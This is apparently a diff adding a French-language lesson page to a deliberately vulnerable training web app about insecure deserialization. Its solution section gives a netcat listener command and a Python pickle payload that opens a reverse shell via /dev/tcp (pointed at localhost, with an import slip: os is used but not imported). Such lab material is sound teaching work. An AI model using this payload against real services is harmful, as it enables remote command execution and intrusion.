@@ -1,0 +1,75 @@
+{% extends "layout.html" %}
+{% block content %}
+<body>
+  <div class="container">
+    <h1>{{ title }}</h1>
+
+    <div class="row">
+      <div class="alert alert-info col-md-12">
+        <h3>Qu'est-ce qu'une "Insecure Deserialization?</h3>
+        <p>
+          Les données extérieures ne doivent pas être considérées bien formées. Des données malformées peuvent être utilisées pour compromettre la sécurité d'un système ou la logique d'une application.
+        </p>
+
+        <a target="_blank" href="https://www.owasp.org/index.php/Deserialization_of_untrusted_data">En savoir plus</a>
+      </div>
+    </div>
+
+    <hr>
+
+    <div class="row">
+      <form method="POST" action="/A8/register">
+        Firstname: <input type="text" name="firstname" id="firstname" value=""/>
+        Lastname: <input type="text" name="lastname" id="lastname" value=""/>
+        <input type="submit" value="Login" />
+      </form>
+      <form action="/A8/login" method="POST">
+        ID: <input type="text" name="ID" id="ID" value=""/>
+        <input class="button" type="submit" value="Login" />
+      </form>
+    </div>
+
+    <hr>
+
+    <div class="row">
+      <div class="col-md-6">
+        <button data-toggle="collapse" data-target="#hints" class="alert alert-info col-md-12">Indices</button>
+        <div id="hints" class="collapse alert alert-info col-md-12">
+          Ici la vulnérabilité consiste à sérialiser un objet avec Python Pickle, afin d'obtenir une exécution arbitraire de commande.
+        </div>
+      </div>
+
+      <div class="col-md-6">
+        <button data-toggle="collapse" data-target="#solution" class="alert alert-success col-md-12">Voir la solution</button>
+        <div id="solution" class="collapse alert alert-success col-md-12">
+          Lancer dans un shell :
+
+          <pre>
+            <code>
+              $ ncat -lvp 4242
+            </code>
+          </pre>
+
+          Puis générez l'ID grâce au script python suivant :
+
+          <code>
+            <pre>
+            import pickle
+            import subprocess
+            import binascii
+
+            class RunBinSh(object):
+              def __reduce__(self):
+                return (os.system,('/bin/sh -i >& /dev/tcp/127.0.0.1/4242 0>&1',))
+            print(binascii.hexlify(pickle.dumps(RunBinSh())))
+            </pre>
+          </code>
+
+          Vous n'avez plus qu'à vous enregistrer avec l'ID généré. Vous avez maintenant un shell !
+        </div>
+      </div>
+    </div>
+
+  </div>
+</body>
+{% endblock %}
